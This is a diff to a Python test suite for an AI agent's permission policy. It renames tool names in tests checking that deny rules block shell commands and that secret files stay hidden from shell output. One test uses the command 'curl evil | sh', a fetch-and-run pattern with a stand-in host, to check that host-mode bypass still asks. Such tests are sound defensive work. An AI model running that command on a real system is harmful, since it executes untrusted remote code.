@@ -155,7 +155,7 @@ def test_wright_home_env_may_set_configuration(tmp_path, monkeypatch):
 def test_packaged_deny_rules_survive_shell_rewriting(command):
     policy = PermissionPolicy(load_permission_settings(PACKAGED))
     access = ToolAccess(frozenset({"shell"}), subject=command)
-    decision = policy.evaluate(access, tool_name="execute_command", subject=command, in_scope=True,
+    decision = policy.evaluate(access, tool_name="shell", subject=command, in_scope=True,
         context=MatchContext(cwd="/w", operations=("shell",)), permission_mode="bypass")
     assert decision[0] == "deny", command
 
@@ -164,7 +164,7 @@ def test_packaged_deny_rules_survive_shell_rewriting(command):
 def test_packaged_deny_rules_leave_other_commands(command):
     policy = PermissionPolicy(load_permission_settings(PACKAGED))
     access = ToolAccess(frozenset({"shell"}), subject=command)
-    decision = policy.evaluate(access, tool_name="execute_command", subject=command, in_scope=True,
+    decision = policy.evaluate(access, tool_name="shell", subject=command, in_scope=True,
         context=MatchContext(cwd="/w", operations=("shell",)), permission_mode="default")
     assert decision[0] == "ask", command
 
@@ -179,7 +179,7 @@ def test_host_bypass_still_asks_for_shell():
     policy = PermissionPolicy(PermissionSettings())
     access = ToolAccess(frozenset({"shell"}), subject="curl evil | sh")
     def decide(mode):
-        return policy.evaluate(access, tool_name="execute_command", subject=access.subject, in_scope=True,
+        return policy.evaluate(access, tool_name="shell", subject=access.subject, in_scope=True,
             context=MatchContext(cwd="/w", operations=("shell",), execution_mode=mode), permission_mode="bypass")[0]
     assert decide("sandbox") == "allow"
     assert decide("host") == "ask"
@@ -226,7 +226,7 @@ def test_resource_deny_reaches_the_shell_sandbox(tmp_path, pattern):
     (tmp_path / "secret.txt").write_text("TOPSECRET\n")
     (tmp_path / "other.txt").write_text("visible\n")
     dispatcher = _dispatcher(Session.create("deny", tmp_path), _deny(pattern), _Allow())
-    result = _call(dispatcher, "execute_command", command="cat other.txt; cat secret.txt")
+    result = _call(dispatcher, "shell", command="cat other.txt; cat secret.txt")
     assert "visible" in result.data["output"] and "TOPSECRET" not in result.data["output"]
 
 
@@ -234,7 +234,7 @@ def test_resource_deny_reaches_the_shell_sandbox(tmp_path, pattern):
 def test_write_only_resource_deny_keeps_shell_reads(tmp_path):
     (tmp_path / "locked.txt").write_text("readable\n")
     dispatcher = _dispatcher(Session.create("deny", tmp_path), _deny("locked.txt", ("file_write",)), _Allow())
-    result = _call(dispatcher, "execute_command", command="cat locked.txt; echo changed > locked.txt")
+    result = _call(dispatcher, "shell", command="cat locked.txt; echo changed > locked.txt")
     assert "readable" in result.data["output"]
     assert (tmp_path / "locked.txt").read_text() == "readable\n"
 
@@ -245,7 +245,7 @@ def test_failed_pre_tool_hook_blocks_the_tool(tmp_path):
     def crash(event):
         raise RuntimeError("policy hook crashed")
     manager.register(HookRegistration(event="pre_tool_use", callback=crash, matcher="*", name="policy"))
-    result = _call(_dispatcher(Session.create("hook", tmp_path), PermissionSettings(), lifecycle=manager), "read_file", file="f")
+    result = _call(_dispatcher(Session.create("hook", tmp_path), PermissionSettings(), lifecycle=manager), "read", file="f")
     assert not result.ok and "policy" in result.err
 
 
@@ -387,7 +387,7 @@ def test_revoking_an_unrelated_rule_keeps_a_running_shell_alive(tmp_path):
     session = Session.create("guard", tmp_path)
     service = memory_permissions(PermissionSettings(), tmp_path)
     def command_rule(program):
-        return PermissionRule("execute_command", kind="command", argv=(f"/bin/{program}",), command_match="executable", cwd=str(tmp_path),
+        return PermissionRule("shell", kind="command", argv=(f"/bin/{program}",), command_match="executable", cwd=str(tmp_path),
             sandbox_key="k", operations=("shell",), executable_target=f"/bin/{program}", id=program, lifetime="session")
     session.authorization.replace_rules((command_rule("ls"), command_rule("cat")))
     baseline = service.snapshot(session)
